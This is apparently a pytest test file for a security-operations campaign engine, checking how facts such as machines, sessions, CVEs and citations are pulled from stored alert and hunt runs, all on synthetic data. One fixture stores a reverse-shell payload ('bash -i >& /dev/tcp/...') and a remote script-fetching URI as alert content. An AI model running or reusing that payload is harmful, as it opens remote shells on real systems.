"""The facts of a stored run: what the campaign engine reads of it (Task 7).

The engine reads no store. ``facts.extract`` reads each run once: the row,
the stored alert context, the stored tool results when a cited document is
not in the context, and the Hosts data for the machine of each address.
``facts.load`` keeps the facts and reads a run again only when its basis
changes.

The data is synthetic: placeholder addresses, names and rule names. The
seed helpers here serve the service and route tests too.
"""

from __future__ import annotations

import logging
from collections.abc import AsyncIterator
from datetime import timedelta
from typing import Any

import pytest
from soc_ai.campaigns import facts
from soc_ai.config import Settings
from soc_ai.store import investigations as inv_svc
from soc_ai.store.auth import utcnow
from soc_ai.store.db import make_engine, make_sessionmaker, run_migrations
from soc_ai.store.models import (
    CampaignRunFacts,
    HostDossier,
    HostMachine,
    Hunt,
    Investigation,
)
from sqlalchemy import event, select
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker

pytestmark = pytest.mark.asyncio

ACTOR = "192.0.2.10"  # agent machine actor-a
ACTOR_2 = "192.0.2.11"  # agent machine actor-b
TARGET = "198.51.100.20"  # network record of web-1
TARGET_2 = "198.51.100.21"  # network record of web-2
LEASED = "192.0.2.30"  # DHCP lease of laptop-1
CONTAINER = "203.0.113.5"  # a container on web-1
BRIDGE = "203.0.113.1"  # a network record in the bridge of the container
OUTSIDE = "198.51.100.99"  # no machine
RULE = "ET EXPLOIT Example Upload Request (CVE-2026-0001)"
RULE_B = "ET EXPLOIT Example Chunked Request"
STORY = "The source host sent exploit requests to the web server."
HUNT_ID = "01JHUNT0000000000000000001"
_UNSET: Any = object()


@pytest.fixture
async def maker(settings_kratos: Settings) -> AsyncIterator[async_sessionmaker[AsyncSession]]:
    engine = make_engine(settings_kratos)
    await run_migrations(engine)
    try:
        yield make_sessionmaker(engine)
    finally:
        await engine.dispose()


async def seed_hosts(db: AsyncSession) -> None:
    """Six machines: two agent machines, two network records, a DHCP lease and a bridge."""
    machines = {
        "agent:a1": HostMachine(
            machine_key="agent:a1",
            agent_name="actor-a",
            agent_id="a1",
            primary_ip=ACTOR,
            address_count=1,
        ),
        "agent:a2": HostMachine(
            machine_key="agent:a2",
            agent_name="actor-b",
            agent_id="a2",
            primary_ip=ACTOR_2,
            address_count=1,
        ),
        "ip:t1": HostMachine(machine_key="ip:t1", name="web-1", primary_ip=TARGET, address_count=2),
        "ip:t2": HostMachine(
            machine_key="ip:t2", name="web-2", primary_ip=TARGET_2, address_count=1
        ),
        "mac:l1": HostMachine(
            machine_key="mac:l1", name="laptop-1", primary_ip=LEASED, address_count=1
        ),
        "ip:b1": HostMachine(machine_key="ip:b1", name="gw-1", primary_ip=BRIDGE, address_count=1),
    }
    db.add_all(list(machines.values()))
    await db.flush()
    for address, key, kind in (
        (ACTOR, "agent:a1", "agent"),
        (ACTOR_2, "agent:a2", "agent"),
        (TARGET, "ip:t1", "network"),
        (TARGET_2, "ip:t2", "network"),
        (CONTAINER, "ip:t1", "container"),
        (LEASED, "mac:l1", "dhcp"),
        (BRIDGE, "ip:b1", "network"),
    ):
        db.add(
            HostDossier(
                host_key=address, ip=address, machine_id=machines[key].id, address_kind=kind
            )
        )
    await db.commit()


def alert_doc(
    doc_id: str,
    at: Any,
    *,
    src: str | None = ACTOR,
    dst: str | None = TARGET,
    rule: str | None = RULE,
    community_id: str | None = None,
    classtype: str | None = "web-application-attack",
    dataset: str = "suricata.alert",
    port: int = 80,
) -> dict[str, Any]:
    """One stored document in the SoAlert JSON form."""
    doc: dict[str, Any] = {
        "id": doc_id,
        "timestamp": at.isoformat() if hasattr(at, "isoformat") else at,
        "source_ip": src,
        "destination_ip": dst,
        "destination_port": port,
        "event_dataset": dataset,
    }
    if rule is not None:
        doc["rule_name"] = rule
    if classtype is not None:
        doc["classtype"] = classtype
    if community_id is not None:
        doc["network_community_id"] = community_id
    return doc


async def seed_run(
    db: AsyncSession,
    alert_id: str,
    *,
    src: str | None = ACTOR,
    dst: str | None = TARGET,
    rule: str = RULE,
    verdict: str = "true_positive",
    event_hours_ago: float | None = 2.0,
    created_minutes_ago: float = 30.0,
    community_id: str | None = None,
    classtype: str | None = "web-application-attack",
    context: Any = _UNSET,
    events: list[dict[str, Any]] | None = None,
    report: dict[str, Any] | None = None,
    started_by: str = "auto-triage",
    synthetic: bool = False,
    finding: tuple[str, int] | None = None,
    subject_ids: list[str] | None = None,
    kind: str | None = None,
) -> str:
    """One finalized run. An alert run with a stored alert context by default.

    ``finding`` makes a finding run of that hunt and ordinal. ``context``
    replaces the stored context payload, and None stores none.
    """
    now = utcnow()
    at = now - timedelta(hours=event_hours_ago) if event_hours_ago is not None else None
    extra: dict[str, Any] = {}
    if finding is not None:
        extra = {
            "kind": "hunt",
            "hunt_id": finding[0],
            "finding_ordinal": finding[1],
            "subject": {
                "type": "hunt",
                "judges": "finding",
                "hunt_id": finding[0],
                "document_ids": list(subject_ids or []),
            },
        }
    if kind is not None:
        extra["kind"] = kind
    inv = await inv_svc.create(
        db,
        alert_es_id=alert_id,
        started_by=started_by,
        rule_name=rule,
        src_ip=src,
        dest_ip=dst,
        is_synth_eval=synthetic,
        **extra,
    )
    if context is _UNSET:
        context = (
            {"alert": alert_doc(alert_id, at, src=src, dst=dst, rule=rule, classtype=classtype)}
            if at is not None
            else None
        )
        if context is not None and community_id is not None:
            context["alert"]["network_community_id"] = community_id
    stored: list[dict[str, Any]] = []
    if context is not None:
        stored.append({"sequence": 1, "kind": "enriched_alert_context", "payload": context})
    for n, item in enumerate(events or [], start=2):
        stored.append({"sequence": n, **item})
    if stored:
        await inv_svc.append_events(db, inv.id, stored)
    await inv_svc.finalize(
        db,
        inv.id,
        status="complete",
        verdict=verdict,
        confidence=0.85,
        summary=STORY,
        report={
            "verdict": verdict,
            "confidence": 0.85,
            "summary": STORY,
            "recommended_actions": [],
            **(report or {}),
        },
    )
    row = await db.get(Investigation, inv.id)
    assert row is not None
    row.created_at = now - timedelta(minutes=created_minutes_ago)
    row.community_id = community_id
    await db.commit()
    return str(inv.id)


async def seed_hunt(db: AsyncSession, hunt_id: str = HUNT_ID, **over: Any) -> None:
    db.add(Hunt(id=hunt_id, objective="Find the upload.", status="complete", **over))
    await db.commit()


async def _extract(db: AsyncSession, *run_ids: str) -> dict[str, Any]:
    found = await db.scalars(select(Investigation).where(Investigation.id.in_(run_ids)))
    runs = list(found.all())
    return await facts.extract(db, runs)


# ── Alert runs ─────────────────────────────────────────────────────────────


async def test_an_alert_run_gives_its_time_machines_class_rule_cve_and_session(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(db, "alert-0001", community_id="1:aaaa", event_hours_ago=3)
        got = (await _extract(db, run_id))[run_id]
    at = got.event_time
    assert at is not None
    assert abs((utcnow() - timedelta(hours=3)) - at) < timedelta(seconds=5)
    assert (got.source, got.target) == ("agent:a1", "ip:t1")
    assert (got.source_join, got.target_join) == ("agent", "network")
    assert (got.source_name, got.target_name) == ("actor-a", "web-1")
    assert (got.source_address, got.target_address) == (ACTOR, TARGET)
    assert got.kind == "alert"
    assert got.tier == "alert"
    assert got.attack_class == "exploit_attempt"
    assert got.rules == frozenset({RULE})
    assert got.cves == frozenset({"CVE-2026-0001"})
    # The row and its alert hold one community id at one time: one session.
    assert got.sessions == (("1:aaaa", at),)
    (doc,) = got.documents
    assert doc.id == "alert-0001"
    assert doc.is_alert
    assert doc.rule_key == RULE
    # The label of a document is the line that the timeline shows for it.
    assert doc.label == RULE
    assert (doc.source, doc.target) == ("agent:a1", "ip:t1")
    assert got.is_seed


async def test_an_alert_of_no_hostile_class_has_no_attack_class(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(db, "alert-0002", classtype="policy-violation")
        got = (await _extract(db, run_id))[run_id]
    assert got.attack_class == ""
    assert not got.is_attack


async def test_a_run_on_a_container_address_has_no_source_machine(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(db, "alert-0003", src=CONTAINER)
        got = (await _extract(db, run_id))[run_id]
    assert got.source is None
    assert got.source_address == CONTAINER
    assert got.target == "ip:t1"


async def test_a_run_on_a_bridge_address_has_no_source_machine(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(db, "alert-0004", src=BRIDGE)
        got = (await _extract(db, run_id))[run_id]
    # The network record joins the address to gw-1, and the address is in the
    # bridge of a container: more than one machine can hold it.
    assert got.source is None
    assert got.source_join is None
    assert got.target == "ip:t1"


async def test_a_dhcp_lease_and_a_network_record_give_machines_with_their_joins(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(db, "alert-0005", src=LEASED, dst=TARGET)
        outside = await seed_run(db, "alert-0006", src=OUTSIDE, dst=TARGET)
        got = await _extract(db, run_id, outside)
    assert (got[run_id].source, got[run_id].source_join) == ("mac:l1", "dhcp")
    assert (got[run_id].target, got[run_id].target_join) == ("ip:t1", "network")
    # An address that the Hosts data holds no machine for is no machine.
    assert got[outside].source is None
    assert got[outside].source_address == OUTSIDE


# ── Finding runs ───────────────────────────────────────────────────────────


def _subject_docs(at: Any) -> list[dict[str, Any]]:
    return [
        alert_doc(
            f"doc-sub-000{n}",
            at,
            rule=None,
            classtype=None,
            dataset="zeek.http",
            community_id=f"1:sub{n}",
        )
        for n in (1, 2, 3)
    ]


def _hunt_report(*citations: list[str]) -> dict[str, Any]:
    """The report of a hunt: one threat finding for each list of cited document ids."""
    return {
        "findings": [
            {"title": f"Finding {n}", "category": "threat", "citations": ids}
            for n, ids in enumerate(citations)
        ]
    }


def _tool_events(doc_id: str, at: Any) -> list[dict[str, Any]]:
    hit = {
        "_id": doc_id,
        "_source": {
            "@timestamp": at.isoformat(),
            "event": {"dataset": "zeek.conn"},
            "source": {"ip": ACTOR},
            "destination": {"ip": TARGET, "port": 22},
        },
    }
    return [
        {
            "kind": "tool_call",
            "payload": {"tool_call_id": "c1", "tool_name": "t_query_events", "args": {}},
        },
        {
            "kind": "tool_result",
            "payload": {"tool_call_id": "c1", "result": {"hits": {"hits": [hit]}}},
        },
    ]


async def test_a_finding_reads_its_subject_documents_and_a_cited_tool_result(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    at = utcnow() - timedelta(hours=4)
    docs = _subject_docs(at)
    async with maker() as db:
        await seed_hosts(db)
        await seed_hunt(db, kind="scheduled", report=_hunt_report([d["id"] for d in docs]))
        run_id = await seed_run(
            db,
            "doc-sub-0001",
            rule="Upload of a web shell",
            finding=(HUNT_ID, 0),
            subject_ids=[d["id"] for d in docs],
            context={"alert": docs[0], "subject_documents": docs},
            events=_tool_events("doc-tool-0001", at),
            report={"citations": ["doc-tool-0001", "alert.source_ip"]},
        )
        got = (await _extract(db, run_id))[run_id]
    assert got.kind == "finding"
    assert got.attack_class == "finding"
    assert got.tier == "scheduled_hunt"
    assert got.hunt_id == HUNT_ID
    assert [d.id for d in got.documents] == [
        "doc-sub-0001",
        "doc-sub-0002",
        "doc-sub-0003",
        "doc-tool-0001",
    ]
    assert got.cited_unresolved == 0
    assert set(got.cited_ids) == {"doc-sub-0001", "doc-sub-0002", "doc-sub-0003", "doc-tool-0001"}
    assert all(d.cited for d in got.documents)
    tool_doc = got.documents[-1]
    assert (tool_doc.source, tool_doc.target, tool_doc.target_port) == ("agent:a1", "ip:t1", 22)
    # A document with no rule name takes the label of what it records.
    assert got.documents[0].label == "zeek.http"
    assert tool_doc.label == "zeek.conn"
    # The anchor of a finding is an alert only by its dataset.
    assert not any(d.is_alert for d in got.documents)
    assert got.rules == frozenset()


async def test_a_finding_with_a_cited_id_that_no_event_holds_counts_it_unresolved(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    at = utcnow() - timedelta(hours=4)
    docs = _subject_docs(at)
    async with maker() as db:
        await seed_hosts(db)
        await seed_hunt(db, lead_id=7, report=_hunt_report([d["id"] for d in docs]))
        run_id = await seed_run(
            db,
            "doc-sub-0001",
            rule="Upload of a web shell",
            finding=(HUNT_ID, 0),
            subject_ids=[d["id"] for d in docs],
            context={"alert": docs[0], "subject_documents": docs},
            report={"citations": ["doc-missing-0001"]},
        )
        got = (await _extract(db, run_id))[run_id]
    assert got.cited_unresolved == 1
    assert len(got.documents) == 3
    assert got.tier == "lead_hunt"


async def test_a_finding_run_holds_the_documents_of_its_own_finding_only(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    """The subject of a finding run stores the documents of every finding of
    its hunt. The second finding of this hunt is about another host. Its
    documents and its sessions are no part of the run on the first finding."""
    at = utcnow() - timedelta(hours=4)
    docs = _subject_docs(at)
    other = alert_doc(
        "doc-other-0001", at, src=LEASED, dst=OUTSIDE, rule=RULE_B, community_id="1:other"
    )
    async with maker() as db:
        await seed_hosts(db)
        await seed_hunt(
            db, report=_hunt_report(["doc-sub-0001", "doc-sub-0002"], ["doc-other-0001"])
        )
        run_id = await seed_run(
            db,
            "doc-sub-0001",
            rule="Upload of a web shell",
            finding=(HUNT_ID, 0),
            subject_ids=[d["id"] for d in docs] + ["doc-other-0001"],
            context={"alert": docs[0], "subject_documents": [*docs, other]},
        )
        got = (await _extract(db, run_id))[run_id]
    assert [d.id for d in got.documents] == ["doc-sub-0001", "doc-sub-0002"]
    assert got.cited_ids == ("doc-sub-0001", "doc-sub-0002")
    assert got.cited_unresolved == 0
    assert {cid for cid, _at in got.sessions} == {"1:sub1", "1:sub2"}
    assert got.rules == frozenset()


async def test_a_cited_document_of_other_hosts_gives_the_run_no_session(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    """A finding cites a package update of the target as context. That flow is
    no session of the run: an alert run on it is no part of the activity."""
    at = utcnow() - timedelta(hours=4)
    docs = _subject_docs(at)
    update = alert_doc(
        "doc-update-0001", at, src=TARGET, dst=OUTSIDE, rule=RULE_B, community_id="1:update"
    )
    async with maker() as db:
        await seed_hosts(db)
        await seed_hunt(db, report=_hunt_report(["doc-sub-0001", "doc-update-0001"]))
        run_id = await seed_run(
            db,
            "doc-sub-0001",
            rule="Upload of a web shell",
            finding=(HUNT_ID, 0),
            subject_ids=[d["id"] for d in docs] + ["doc-update-0001"],
            context={"alert": docs[0], "subject_documents": [*docs, update]},
        )
        got = (await _extract(db, run_id))[run_id]
    assert [d.id for d in got.documents] == ["doc-sub-0001", "doc-update-0001"]
    assert {cid for cid, _at in got.sessions} == {"1:sub1"}


async def test_a_cited_document_of_other_hosts_gives_the_run_no_artifact(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    """Two actors that cite the same package update of the target share no
    artifact: the rule and the HTTP key of that document are no part of the run."""
    at = utcnow() - timedelta(hours=4)
    docs = _subject_docs(at)
    docs[0]["zeek_http_method"] = "POST"
    docs[0]["zeek_http_uri"] = "/upload.php?step=1"
    update = alert_doc("doc-update-0001", at, src=TARGET, dst=OUTSIDE, rule=RULE_B)
    update["zeek_http_method"] = "GET"
    update["zeek_http_uri"] = "/dists/stable/InRelease"
    async with maker() as db:
        await seed_hosts(db)
        await seed_hunt(db, report=_hunt_report(["doc-sub-0001", "doc-update-0001"]))
        run_id = await seed_run(
            db,
            "doc-sub-0001",
            rule="Upload of a web shell",
            finding=(HUNT_ID, 0),
            subject_ids=["doc-sub-0001", "doc-update-0001"],
            context={"alert": docs[0], "subject_documents": [docs[0], update]},
        )
        got = (await _extract(db, run_id))[run_id]
    assert [d.id for d in got.documents] == ["doc-sub-0001", "doc-update-0001"]
    assert got.http_keys == frozenset({"POST /upload.php"})
    assert got.rules == frozenset()
    assert got.cves == frozenset()


async def test_a_finding_run_whose_hunt_is_gone_keeps_its_anchor_and_its_citations(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    at = utcnow() - timedelta(hours=4)
    docs = _subject_docs(at)
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(
            db,
            "doc-sub-0001",
            rule="Upload of a web shell",
            finding=(HUNT_ID, 0),
            subject_ids=[d["id"] for d in docs],
            context={"alert": docs[0], "subject_documents": docs},
            report={"citations": ["doc-sub-0003"]},
        )
        got = (await _extract(db, run_id))[run_id]
    assert [d.id for d in got.documents] == ["doc-sub-0001", "doc-sub-0003"]
    assert got.cited_ids == ("doc-sub-0003",)
    assert got.tier == "hunt"


async def test_a_cited_hash_cve_id_or_run_id_is_no_cited_document(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    citations = [
        "CVE-2026-0001",
        "d41d8cd98f00b204e9800998ecf8427e",
        "01H0000000000000000000000A",
        "alert.rule_name",
    ]
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(db, "doc-alert-0001", report={"citations": citations})
        got = (await _extract(db, run_id))[run_id]
    assert got.cited_ids == ()
    assert got.cited_unresolved == 0


async def test_a_document_names_a_host_in_its_uri_or_in_a_shell_path_only(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    at = utcnow() - timedelta(hours=2)
    doc = alert_doc("doc-alert-0001", at)
    doc["zeek_http_uri"] = "/x.php?u=http://files.example.test/a.sh"
    doc["zeek_http_host"] = "web-1.example.test"
    doc["payload_printable"] = (
        "User-Agent: tool (https://tool.example.test/book)\r\n\r\n"
        "c=bash -i >& /dev/tcp/203.0.113.77/4444 0>&1"
    )
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(db, "doc-alert-0001", context={"alert": doc})
        got = (await _extract(db, run_id))[run_id]
    assert got.documents[0].named == ("203.0.113.77", "files.example.test")


async def test_a_lead_run_is_a_lead_of_the_analytic_tier(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(
            db,
            "doc-sub-0001",
            rule="Lead 3 on web-1",
            kind="lead",
            context=None,
            report={"event_time": (utcnow() - timedelta(hours=1)).isoformat()},
        )
        got = (await _extract(db, run_id))[run_id]
    assert (got.kind, got.tier, got.attack_class) == ("lead", "analytic", "finding")


async def test_a_run_with_a_report_stage_and_impact_gives_both(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(db, "alert-0007", report={"stage": "action", "impact": "succeeded"})
        got = (await _extract(db, run_id))[run_id]
    assert got.stage_claim == "action"
    assert got.impact == "succeeded"


# ── Load ───────────────────────────────────────────────────────────────────


async def test_load_stores_the_facts_and_reads_them_again_until_the_verdict_changes(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(db, "alert-0008")
    engine = maker.kw["bind"]
    statements: list[str] = []

    def count(_conn: Any, _cursor: Any, statement: str, *_args: Any) -> None:
        if "investigation_events" in statement:
            statements.append(statement)

    event.listen(engine.sync_engine, "before_cursor_execute", count)
    try:
        async with maker() as db:
            inv = await db.get(Investigation, run_id)
            assert inv is not None
            first = await facts.load(db, [inv])
            await db.commit()
            assert first[run_id].verdict == "true_positive"
            row = await db.get(CampaignRunFacts, run_id)
            assert row is not None
            assert row.basis == facts.basis_of(inv)
            assert row.basis.endswith(f"|v{facts.FACTS_VERSION}")
            # Version 2 adds the label of each document: every run is read again.
            assert facts.FACTS_VERSION == 3

        statements.clear()
        async with maker() as db:
            inv = await db.get(Investigation, run_id)
            assert inv is not None
            again = await facts.load(db, [inv])
        assert again == first
        assert statements == []

        async with maker() as db:
            await inv_svc.resolve(
                db,
                run_id,
                verdict="false_positive",
                confidence=0.9,
                rationale="The upload was a test.",
                recommended_actions=None,
                resolved_by="analyst",
                resolved_via="manual",
            )
        async with maker() as db:
            inv = await db.get(Investigation, run_id)
            assert inv is not None
            changed = await facts.load(db, [inv])
            await db.commit()
            row = await db.get(CampaignRunFacts, run_id)
            assert row is not None
            assert row.basis == facts.basis_of(inv)
        assert statements
        assert changed[run_id].verdict == "false_positive"
        assert row.facts["verdict"] == "false_positive"
    finally:
        event.remove(engine.sync_engine, "before_cursor_execute", count)


async def test_load_with_no_write_stores_nothing(maker: async_sessionmaker[AsyncSession]) -> None:
    async with maker() as db:
        await seed_hosts(db)
        run_id = await seed_run(db, "alert-0009")
        inv = await db.get(Investigation, run_id)
        assert inv is not None
        got = await facts.load(db, [inv], write=False)
        await db.commit()
        assert run_id in got
        assert await db.get(CampaignRunFacts, run_id) is None


async def test_a_run_whose_context_is_no_mapping_gives_no_entry_and_no_exception(
    maker: async_sessionmaker[AsyncSession], caplog: pytest.LogCaptureFixture
) -> None:
    async with maker() as db:
        await seed_hosts(db)
        bad = await seed_run(db, "alert-0010", context=["not", "a", "mapping"])
        good = await seed_run(db, "alert-0011")
        with caplog.at_level(logging.WARNING, logger="soc_ai.campaigns.facts"):
            got = await _extract(db, bad, good)
    assert bad not in got
    assert good in got
    assert any(bad in record.getMessage() for record in caplog.records)


# ── The machines that a finding names ──────────────────────────────────────


def test_the_addresses_of_a_finding_are_its_hosts_that_are_addresses() -> None:
    finding = {"hosts": [TARGET, " " + ACTOR, "web-1", TARGET, "", 7, "not an address"]}
    assert facts.finding_addresses(finding) == (TARGET, ACTOR)
    assert facts.finding_addresses({"hosts": "198.51.100.10"}) == ()
    assert facts.finding_addresses({}) == ()


async def test_a_finding_run_holds_the_machines_that_its_finding_names(
    maker: async_sessionmaker[AsyncSession],
) -> None:
    """The finding cites two summary queries and names two hosts. The run then
    has no record of its own, and the facts hold the two machines by name. A
    bridge address and an address that the Hosts data does not know give no
    machine."""
    at = utcnow() - timedelta(hours=4)
    docs = _subject_docs(at)
    report = {
        "findings": [
            {
                "title": "File read on web-1",
                "category": "threat",
                "hosts": [TARGET, ACTOR, BRIDGE, OUTSIDE],
                "citations": ["t_query_events_oql zeek.http groupby http.uri"],
            }
        ]
    }
    async with maker() as db:
        await seed_hosts(db)
        await seed_hunt(db, report=report)
        finding_run = await seed_run(
            db,
            "doc-sub-0001",
            rule="File read on web-1",
            finding=(HUNT_ID, 0),
            subject_ids=[d["id"] for d in docs],
            context={"alert": docs[0], "subject_documents": docs},
        )
        alert_run = await seed_run(db, "doc-alert-0009", context={"alert": docs[1]})
        got = await _extract(db, finding_run, alert_run)
    assert got[finding_run].named_machines == ("agent:a1", "ip:t1")
    assert got[alert_run].named_machines == ()
    assert type(got[finding_run]).from_json(got[finding_run].to_json()).named_machines == (
        "agent:a1",
        "ip:t1",
    )
